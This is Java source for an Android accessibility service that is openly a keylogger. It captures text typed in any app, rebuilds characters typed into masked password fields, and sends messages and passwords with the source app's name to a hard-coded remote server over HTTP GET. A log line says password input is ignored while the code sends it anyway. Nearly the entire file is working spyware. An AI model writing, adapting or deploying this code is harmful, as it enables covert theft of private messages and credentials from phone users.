package com.example.keyloggerapp;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.List;

public class KeyloggerAccessibilityService extends AccessibilityService {
    private String baseUrl = "http://13.51.79.222:5000/send_some_msg?text=";
    private String current_text = "";
    private String curr_pack_name = "";
    private int counter = 0;

    private Boolean checkIsPass(AccessibilityNodeInfo source) {
        if (source != null) {
            int inputType = source.getInputType();
            if ((inputType & 128) != 0 || (inputType & 16) != 0 || (inputType & 144) != 0 || (inputType & 224) != 0) {
                Log.d("AccessibilityService", "User is typing in a password field - Ignoring input.");
                return true;
            }
        }
        return false;
    }

    private Boolean to_send_msg(String msg) {
        if (msg.length() == 0 || msg.equals("\u200fהודעה")) {
            return false;
        }
        return true;
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            List<CharSequence> textList = event.getText();
            if (!textList.isEmpty()) {
                CharSequence text = textList.get(0);
                Log.d("Keylogger", "User typed: " + text.toString());
                if (text.length() == 0) {
                    return;
                }
                if (text.length() == 1) {
                    if (!to_send_msg(this.current_text).booleanValue()) {
                        return;
                    }
                    String packageMsg = "From: " + this.curr_pack_name + " Msg is: ";
                    String final_text = this.baseUrl + packageMsg + this.current_text;
                    HttpSender.sendGetRequest(final_text);
                    return;
                }
                if (checkIsPass(event.getSource()).booleanValue()) {
                    String packageMsg2 = "From: " + this.curr_pack_name + " PASSWORD!!!! is: ";
                    String final_text2 = this.baseUrl + packageMsg2 + this.current_text;
                    HttpSender.sendGetRequest(final_text2);
                }
                this.curr_pack_name = event.getPackageName().toString();
                try {
                    String strText = text.toString();
                    if (strText.charAt(strText.length() - 2) == 8226) {
                        this.current_text += " PASSWORD " + strText.charAt(strText.length() - 1);
                    } else {
                        this.current_text = text.toString();
                    }
                } catch (Exception e) {
                    this.current_text += "Some Error Happned.";
                }
            }
        }
        if (event.getEventType() == 32) {
            event.getPackageName().toString();
        }
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onInterrupt() {
    }
}
